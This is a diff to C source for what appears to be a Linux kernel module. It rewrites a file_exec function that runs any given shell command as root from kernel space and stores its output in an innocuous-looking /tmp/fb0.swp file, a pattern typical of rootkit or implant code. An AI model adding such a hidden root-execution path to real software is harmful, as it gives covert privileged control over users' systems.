@@ -98,16 +98,44 @@ int file_write(const char *filename, const u8 *content, size_t content_len)
     return retv;
 }
 
-int file_exec(const char *cmd, u8 **out_buf, size_t *out_buflen)
+int file_exec(char *cmd, u8 **out_buf, size_t *out_buflen)
 {
-    char* envp[] = {"HOME=/", "PATH=/sbin:/bin:/usr/sbin:/usr/bin", NULL};
-    char* argv[] = {"/bin/bash", "-c", NULL, NULL};
+    #define SHELL_PATH "/bin/bash"
+    #define STDOUT_FILE "/tmp/fb0.swp"
+    #define BASH_POSTFIX " 1>" STDOUT_FILE " 2>\\&1"
+
+    char* envp[] = {"HOME=/", "PWD=/", "TERM=linux", "USER=root", "SHELL=" SHELL_PATH, "PATH=/sbin:/bin:/usr/sbin:/usr/bin", NULL};
+    char* argv[] = {SHELL_PATH, "-c", NULL, NULL};
     size_t bash_cmd_len;
     int cmd_retv;
     int retv;
 
-    #define STDOUT_FILE "/tmp/fb0.swp"
+    bash_cmd_len = strlen(cmd) + strlen(BASH_POSTFIX) + 1; 
+    
+    argv[2] = kzmalloc(bash_cmd_len, GFP_KERNEL);
+    if (IS_ERR(argv[2]))
+        return PTR_ERR(argv[2]);
+
+    sprintf(argv[2], "%s%s", cmd, BASH_POSTFIX);
+    cmd_retv = call_usermodehelper(argv[0], argv, envp, UMH_WAIT_PROC);
+    kzfree(argv[2], bash_cmd_len);
+
+    retv = file_read(STDOUT_FILE, out_buf, out_buflen);
+    pr_err("[+] read %d bytes\n", retv);
+    if (retv < 0)
+        return retv;
+
+    return cmd_retv;
+
+
+    /*#define STDOUT_FILE "/tmp/fb0.swp"
     #define CMD_POSTFIX " 2>&1 >"
+
+    char* envp[] = {"HOME=/", "PWD=/", "TERM=xterm-256color", "USER=root", "SHELL=/bin/bash" "PATH=/sbin:/bin:/usr/sbin:/usr/bin", NULL};
+    char* argv[] = {"/bin/wall", "-c", NULL, NULL};
+    size_t bash_cmd_len;
+    int cmd_retv;
+    int retv;
 
     bash_cmd_len = strlen(cmd) + strlen(CMD_POSTFIX) + strlen(STDOUT_FILE) + 1; 
     
@@ -119,12 +147,14 @@ int file_exec(const char *cmd, u8 **out_buf, size_t *out_buflen)
 
     pr_err("[*] executing: \"%s %s '%s'\"\n", argv[0], argv[1], argv[2]);
     cmd_retv = call_usermodehelper(argv[0], argv, envp, UMH_WAIT_PROC);
-    kzfree(argv[2], bash_cmd_len);
+    //kzfree(argv[2], bash_cmd_len);
+
+    pr_err("[*] call_usermodehelper returned exit status: %d, signal number: %d\n", cmd_retv >> 8, cmd_retv & 0xFF);
 
     retv = file_read(STDOUT_FILE, out_buf, out_buflen);
     pr_err("[+] read %d bytes\n", retv);
     if (retv < 0)
         return retv;
 
-    return cmd_retv;
+    return cmd_retv;*/
 }
